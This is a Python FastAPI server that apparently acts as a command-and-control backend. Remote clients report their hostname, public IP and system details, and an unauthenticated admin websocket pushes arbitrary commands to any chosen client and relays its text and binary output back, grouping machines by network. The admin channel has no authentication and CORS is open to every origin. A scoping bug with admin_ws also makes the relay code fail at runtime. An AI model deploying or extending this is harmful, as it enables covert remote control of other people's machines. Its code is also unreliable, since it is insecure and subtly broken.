from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import time
import json
import os
import asyncio
import logging

logging.basicConfig(level=logging.INFO)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients = {}
client_infos = {}
last_seen = {}
hostname_map = {}
public_ip_map = {}
admin_ws = None

async def ping_clients():
    while True:
        now = time.time()
        for cid, ws in list(clients.items()):
            if now - last_seen.get(cid, 0) > 30:
                logging.info(f"Client timeout detected: {cid}")
                remove_client(cid)
        await asyncio.sleep(10)

@app.on_event("startup")
async def startup():
    asyncio.create_task(ping_clients())

@app.get("/clients")
async def get_clients():
    networks = {}
    now = time.time()
    for hostname, cid in hostname_map.items():
        info = client_infos.get(cid, {})
        public_ip = info.get("public_ip", "Unknown Network")
        net_title = f"Network {public_ip}" if public_ip != "Unknown Network" else "Local Network"
        if net_title not in networks:
            networks[net_title] = []
        status = "Online" if now - last_seen.get(cid, 0) < 30 else "Offline"
        networks[net_title].append({
            "id": cid,
            "hostname": hostname,
            "status": status,
            "info": info
        })
    return networks

@app.websocket("/ws/client/{client_id}")
async def ws_client(ws: WebSocket, client_id: str):
    await ws.accept()
    sysinfo = None

    try:
        while True:
            msg = await ws.receive()
            if "text" in msg:
                try:
                    data = json.loads(msg["text"])
                    if data.get("type") == "client_info":
                        sysinfo = data.get("data", {})
                        break
                except:
                    continue
            await asyncio.sleep(0.1)
    except:
        logging.error(f"Failed to get initial info from client {client_id}")
        return

    hostname = sysinfo.get("hostname", client_id)
    public_ip = sysinfo.get("public_ip", "unknown")

    old_id = hostname_map.get(hostname)
    if old_id and old_id != client_id:
        try:
            if old_id in clients:
                await clients[old_id].close()
        except:
            pass
        remove_client(old_id)

    clients[client_id] = ws
    client_infos[client_id] = sysinfo
    hostname_map[hostname] = client_id
    public_ip_map[client_id] = public_ip
    last_seen[client_id] = time.time()

    logging.info(f"Client connected: {hostname} ({client_id})")

    try:
        while True:
            msg = await ws.receive()
            last_seen[client_id] = time.time()

            if "text" in msg and msg["text"] != "pong":
                try:
                    data = json.loads(msg["text"])
                    if data.get("type") == "client_info":
                        client_infos[client_id] = data.get("data", {})
                        if admin_ws:
                            try:
                                await admin_ws.send_text(json.dumps({
                                    "type": "client_update",
                                    "client_id": client_id,
                                    "data": data.get("data", {})
                                }))
                            except:
                                admin_ws = None
                        continue
                except json.JSONDecodeError:
                    pass

                if admin_ws:
                    try:
                        await admin_ws.send_text(f"[{client_id}] {msg['text']}")
                    except:
                        admin_ws = None

            elif "bytes" in msg:
                if admin_ws:
                    try:
                        await admin_ws.send_bytes(msg["bytes"])
                    except:
                        admin_ws = None

    except WebSocketDisconnect:
        logging.info(f"Client disconnected: {hostname} ({client_id})")
        remove_client(client_id)

@app.websocket("/ws/admin")
async def ws_admin(ws: WebSocket):
    global admin_ws
    await ws.accept()
    admin_ws = ws
    logging.info("Admin connected")

    try:
        await ws.send_text(json.dumps({
            "type": "init",
            "clients": {cid: {"info": info, "last_seen": last_seen.get(cid, 0)}
                        for cid, info in client_infos.items()}
        }))

        while True:
            msg = await ws.receive_json()
            target = msg.get("target")
            cmd = msg.get("cmd")
            if target in clients:
                try:
                    await clients[target].send_text(cmd)
                except Exception as e:
                    await ws.send_text(f"Error sending to {target}: {str(e)}")
            else:
                await ws.send_text(f"Client {target} not found or offline")

    except WebSocketDisconnect:
        logging.info("Admin disconnected")
        admin_ws = None

@app.get("/")
async def root():
    try:
        with open("static/index.html", 'r', encoding='utf-8') as f:
            return HTMLResponse(f.read())
    except FileNotFoundError:
        return HTMLResponse("""
        <html>
            <body>
                <h1>Admin Panel</h1>
                <p>Please create static/index.html file</p>
            </body>
        </html>
        """)

def remove_client(cid):
    clients.pop(cid, None)
    client_infos.pop(cid, None)
    last_seen.pop(cid, None)
    public_ip_map.pop(cid, None)
    for host, id_ in list(hostname_map.items()):
        if id_ == cid:
            hostname_map.pop(host)

app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__ == "__main__":
    os.makedirs("static", exist_ok=True)
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port,
        reload=False,  # Reload deaktiviert in Production
        ws_ping_interval=20,
        ws_ping_timeout=40
    )
